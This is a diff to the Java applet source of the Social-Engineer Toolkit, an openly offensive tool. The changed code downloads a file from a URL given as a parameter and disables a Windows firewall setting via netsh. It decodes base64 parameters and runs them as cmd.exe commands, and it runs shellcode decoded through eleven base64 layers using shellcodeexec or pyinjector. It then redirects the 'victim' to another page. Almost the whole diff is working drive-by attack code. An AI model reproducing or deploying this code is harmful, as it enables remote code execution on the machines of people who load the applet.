@@ -7,6 +7,9 @@ import sun.misc.BASE64Decoder;
 import java.net.URL;
 import java.net.URLConnection;
 
+// import javax.swing.JOptionPane;
+// JOptionPane.showMessageDialog(null, "Hello World!");
+
 /**************************************************************
 *
 *    Java Applet for the Social-Engineer Toolkit
@@ -85,6 +88,7 @@ public class Java extends Applet {
     	   	if ( downParm.length() > 0  && pfad.length() > 0 )
 	        {
 
+       // powershell detection here
 	   if ( osType < 1 )
 	   {
 	       // here we check for powershell
@@ -130,12 +134,10 @@ public class Java extends Applet {
 
 		if ( osType < 1 )
 		{
-		// This is if we are using a custom payload delivery
-		// CUSTOM PAYLOAD FOR WINDOWS HERE
-		// Boom.
-
-		// if sixth parameter is greater than yes, which is CUST, four characters then trigger on custom payload for download
-		if (sixthParm.length() > 3) {
+		    // This is if we are using a custom payload delivery
+		    // CUSTOM PAYLOAD FOR WINDOWS HERE
+		    // if sixth parameter is greater than yes, which is CUST, four characters then trigger on custom payload for download
+    		if (sixthParm.length() > 3) {
                 // URL parameter
                 URL url = new URL(downParm);
                 // Open the conneciton
@@ -170,12 +172,11 @@ public class Java extends Applet {
                 out.flush();
                 out.close();
                 }
-                //}
-
-                }
+        }
 
     	// download file all other OS
-		if ( osType > 1 ){
+		if ( osType > 1 )
+        {
                 // URL parameter
                 URL url = new URL(downParm);
                 // Open the conneciton
@@ -194,12 +195,13 @@ public class Java extends Applet {
                 byte[] data = new byte[contentLength];
                 int bytesRead = 0;
                 int offset = 0;
-                while (offset < contentLength) {
+                while (offset < contentLength) 
+                {
                         bytesRead = in.read(data, offset, data.length - offset);
                         if (bytesRead == -1)
                         break;
                         offset += bytesRead;
-                            }
+                }
                 // close it
                 in.close();
                 // write file out to pfad
@@ -209,123 +211,107 @@ public class Java extends Applet {
                 out.write(data);
                 out.flush();
                 out.close();
-		}
-		}
+		    }
 
+
+/*
             // has it executed yet? then target nextPage to victim
             String page = getParameter( "9" );
             if ( page != null && page.length() > 0 )
-           {
+            {
                 URL urlPage = new URL(page);
                 getAppletContext().showDocument(urlPage);
-           }
+            }
+*/
+    	// Here is where we define OS type, i.e. windows, linux, osx, etc.
 
-    	    // Here is where we define OS type, i.e. windows, linux, osx, etc.
-            if ( osType < 1 ) // If we're running Windows 
+        if ( osType < 1 ) // If we're running Windows 
+        {
+            // attempt to disable statefulftp if running as an administrator
+            f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
+            // powershell x86 or 64 bit
+            if (thirdParm.length() > 3) 
             {
-                        // attempt to disable statefulftp if running as an administrator
-                        f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
-                        // powershell x86 or 64 bit
-                        if (thirdParm.length() > 3) 
-                        {
-                        // this detection is for the new powershell vector, it will run a special command if the flag is turned on in SET
-                        if (arch.contains("86") || arch.contains("64"))
-                                {
-                                // this will be 64 bit
-                                if (fourthParm.length() > 3)
-				{
-					// iterate through Parm for our injection 
-					String strMain = fourthParm;
-					String[] arrSplit = strMain.split(",");
-					for (int i=0; i<arrSplit.length; i++)
-					{
-						f = Runtime.getRuntime().exec("cmd /c powershell -ec " + arrSplit[i]);
-	                }
-                }
-                }
-                else if (arch.contains("i"))
-                {
-                    // this will be 32 bit
-                    if (thirdParm.length() > 3)
-                    {
-					    // iterate through Parm for our injection
-                        String strMain = thirdParm;
-                        String[] arrSplit = strMain.split(",");
-                        for (int i=0; i<arrSplit.length; i++)
-                        {
-						    f = Runtime.getRuntime().exec("cmd /c powershell -ec " + arrSplit[i]);
-	    				}
-                      }
-                   }
-                }
-                // if we aren't using the shellcodeexec attack
-                if (nextParm.length() < 3)
-                {
+                BASE64Decoder decoder = new BASE64Decoder();
+                byte[] decoded = decoder.decodeBuffer(thirdParm);
+                String decoded_string =  new String(decoded);
+		        // iterate through Parm for our injection 
+			    String strMain = decoded_string;
+			    String[] arrSplit = strMain.split(",");
+		        for (int i=0; i<arrSplit.length; i++)
+			    {
+	                f = Runtime.getRuntime().exec("cmd.exe /c " + arrSplit[i]);
+	            }            
+            }
+
+     // }
+            // if we aren't using the shellcodeexec attack
+            if (nextParm.length() < 3)
+            {
 			    // if we turned on binary dropping
 			    if (sixthParm.length() > 2)
 			    {
-
-				// if we are using the SET interactive shell
-				if (fifthParm.length() > 2)
-				{
+				    // if we are using the SET interactive shell
+				    if (fifthParm.length() > 2)
+				    {
 					//  logfile stuff here 42logfile42.tmp
 					// write out a temp file if we aren't going to pass parameters
-					f = Runtime.getRuntime().exec("cmd.exe /c \"" + "echo " + fifthParm + " > " + writedir + "42logfile.tmp" + "\"");
-					f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + fifthParm + "\"");
-				}
-				// if we aren't using SET interactive shell
-				if (fifthParm.length() < 2)
-				{
-			                f = Runtime.getRuntime().exec("cmd.exe /c " + pfad);
-					//f.waitFor();
-
-				}
-
-			}
-                }
-                // if we are using shellcode exec
-                if (nextParm.length() > 3)
-                {
+				        f = Runtime.getRuntime().exec("cmd.exe /c \"" + "echo " + fifthParm + " > " + writedir + "42logfile.tmp" + "\"");
+					    f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + fifthParm + "\"");
+				    }
 
 
-			if (sixthParm.length() > 2)
-			{
-				// all parameters are base64 encoded, this will decode for us and pass the decoded strings
-                BASE64Decoder decoder = new BASE64Decoder();
-                byte[] decoded = decoder.decodeBuffer(nextParm);
-				// decode again
-				String decoded_string =  new String(decoded);
-				String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
-				// again
-				String decoded_string_3 = new String(decoder.decodeBuffer(decoded_string_2));
-				// again
-				String decoded_string_4 = new String(decoder.decodeBuffer(decoded_string_3));
-				// again
-				String decoded_string_5 = new String(decoder.decodeBuffer(decoded_string_4));
-				// again
-				String decoded_string_6 = new String(decoder.decodeBuffer(decoded_string_5));
-				// again
-				String decoded_string_7 = new String(decoder.decodeBuffer(decoded_string_6));
-				// again 
-				String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
-				// again
-				String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
-                // again
-		        String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
-		        // last one
-                String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
+				    // if we aren't using SET interactive shell
+				    if (fifthParm.length() < 2)
+				    {
+			            f = Runtime.getRuntime().exec("cmd.exe /c " + pfad);
+				    }
+   			   }
+            }
 
-				PrintStream out = null;
-				String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
-				try 
-				{
-				    out = new PrintStream(new FileOutputStream(writedir + randomfile));
-				    out.print(decoded_string_11);
-				}
-				finally 
-				{
-				    if (out != null) out.close();
-				}
+           // if we are using shellcode exec
+           if (nextParm.length() > 3)
+           {
+
+		        if (sixthParm.length() > 2)
+			    {
+				    // all parameters are base64 encoded, this will decode for us and pass the decoded strings
+                    BASE64Decoder decoder = new BASE64Decoder();
+                    byte[] decoded = decoder.decodeBuffer(nextParm);
+				    String decoded_string =  new String(decoded);
+                    // decode again
+				    String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
+				    // again
+				    String decoded_string_3 = new String(decoder.decodeBuffer(decoded_string_2));
+				    // again
+				    String decoded_string_4 = new String(decoder.decodeBuffer(decoded_string_3));
+				    // again
+				    String decoded_string_5 = new String(decoder.decodeBuffer(decoded_string_4));
+				    // again
+				    String decoded_string_6 = new String(decoder.decodeBuffer(decoded_string_5));
+				    // again
+				    String decoded_string_7 = new String(decoder.decodeBuffer(decoded_string_6));
+				    // again 
+				    String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
+				    // again
+				    String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
+                    // again
+		            String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
+		            // last one
+                    String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
+
+				    PrintStream out = null;
+				    String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
+				    try 
+				    {
+				        out = new PrintStream(new FileOutputStream(writedir + randomfile));
+				        out.print(decoded_string_11);
+				    }
+
+				    finally 
+				    {
+				        if (out != null) out.close();
+				    }
 					// this is if we are using multipyinjector
 			        f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
 					// this runs the single instance of shellcodeexec, pyinjector, or a binary
@@ -334,6 +320,8 @@ public class Java extends Applet {
 	            }
 
             }
+            //}
+
         else // if not windows then use linux/osx/etc.
         {
 		    // change permisisons to execute
@@ -349,6 +337,15 @@ public class Java extends Applet {
             }
 			initialized = this;
 
+        }
+
+    // has it executed yet? then target nextPage to victim
+    String page = getParameter( "9" );
+    if ( page != null && page.length() > 0 )
+        {
+            URL urlPage = new URL(page);
+            getAppletContext().showDocument(urlPage);
+        }
 
         } 
             catch(IOException e) {
@@ -359,5 +356,8 @@ public class Java extends Applet {
     	{
 		    exception.printStackTrace();
 	    }
+
     }
 }
+
+
